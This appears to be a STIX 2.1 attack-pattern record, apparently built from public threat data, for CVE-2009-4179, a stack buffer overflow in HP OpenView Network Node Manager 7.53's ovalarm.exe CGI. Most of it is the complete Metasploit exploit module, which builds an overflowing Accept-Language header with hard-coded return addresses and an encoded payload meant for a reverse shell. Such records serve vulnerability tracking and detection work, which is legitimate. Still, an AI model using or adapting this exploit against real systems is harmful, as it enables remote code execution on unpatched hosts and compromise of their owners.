{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d5ac0660-d710-4e74-885b-f15a8df06a9c",
    "created": "2024-08-14T16:54:18.422758Z",
    "modified": "2024-08-14T16:54:18.422762Z",
    "name": "HP OpenView Network Node Manager ovalarm.exe CGI Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53. By sending a specially crafted CGI request to ovalarm.exe, an attacker can execute arbitrary code.  This specific vulnerability is due to a call to \"sprintf_new\" in the \"isWide\" function within \"ovalarm.exe\". A stack buffer overflow occurs when processing an HTTP request that contains the following.  1. An \"Accept-Language\" header longer than 100 bytes 2. An \"OVABverbose\" URI variable set to \"on\", \"true\" or \"1\"  The vulnerability is related to \"_WebSession::GetWebLocale()\".  NOTE: This exploit has been tested successfully with a reverse_ord_tcp payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_ovalarm_lang.rb",
            "external_id": "hp_nnm_ovalarm_lang.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4179"
        },
        {
            "source_name": "reference",
            "url": "http://dvlabs.tippingpoint.com/advisory/TPTI-09-12"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01950877"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Network Node Manager ovalarm.exe CGI Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53.\n        By sending a specially crafted CGI request to ovalarm.exe, an attacker can execute\n        arbitrary code.\n\n        This specific vulnerability is due to a call to \"sprintf_new\" in the \"isWide\"\n        function within \"ovalarm.exe\". A stack buffer overflow occurs when processing an\n        HTTP request that contains the following.\n\n        1. An \"Accept-Language\" header longer than 100 bytes\n        2. An \"OVABverbose\" URI variable set to \"on\", \"true\" or \"1\"\n\n        The vulnerability is related to \"_WebSession::GetWebLocale()\".\n\n        NOTE: This exploit has been tested successfully with a reverse_ord_tcp payload.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-4179' ],\n          [ 'OSVDB', '60930' ],\n          [ 'BID', '37347' ],\n          [ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-09-12' ],\n          [ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01950877' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 650,\n          'BadChars' => (0..0x1f).to_a.pack('C*'),\n          'StackAdjustment'\t=> -3500,\n          'DisableNops' => true,\n          'EncoderType'     => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister'  => 'ESP'\n            },\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'HP OpenView Network Node Manager 7.53', { 'Ret' => 0x5a212a4a } ],  # jmp esp in ov.dll\n          [ 'HP OpenView Network Node Manager 7.53 (Windows 2003)', { 'Ret' => 0x71c02b67 } ]   # push esp / ret in ws2_32.dll\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-12-09'))\n  end\n\n  def exploit\n\n    # sprintf_new(buf, \"@@ isWide: comparing '%s' and '%s'\", bigstr, dunno);\n    start = \"@@ isWide: comparing '\"\n\n    sploit = rand_text_alphanumeric(78)\n    sploit << [0xffffffff].pack('V')   # for jle\n    sploit << [0xffffffff].pack('V')   # increment me!\n    sploit << rand_text_alphanumeric(4)\n    sploit << [0x5a404058].pack('V')   # ptr to nul byte\n    sploit << rand_text_alphanumeric(8)\n    sploit << [target.ret].pack('V')   # ret\n    sploit << payload.encoded\n\n    print_status(\"Trying target #{target.name}...\")\n\n    send_request_cgi({\n      'uri'\t\t  => '/OvCgi/ovalarm.exe',\n      'method'\t  => \"GET\",\n      'encode_params' => false,\n      'headers'  => {\n        'Accept-Language' => sploit\n      },\n      'vars_get' => {\n        'OVABverbose' => '1'\n      }\n    }, 3)\n\n    handler\n\n  end\nend\n\n=begin\n1:014> s -b 0x5a000000 0x5a06a000 ff e4\n5a01d78d  ff e4 00 00 83 c4 08 85-c0 75 14 68 18 2f 04 5a  .........u.h./.Z\n1:014> u 0x5a01d78d L1\nov!OVHelpAPI+0x18d:\n5a01d78d ffe4            jmp     esp <- jmp esp for 7.53, will update in a sec.\n=end\n",
    "x_mitre_disclosure_date": "2009-12-09",
    "x_mitre_platforms": [
        "win'"
    ]
}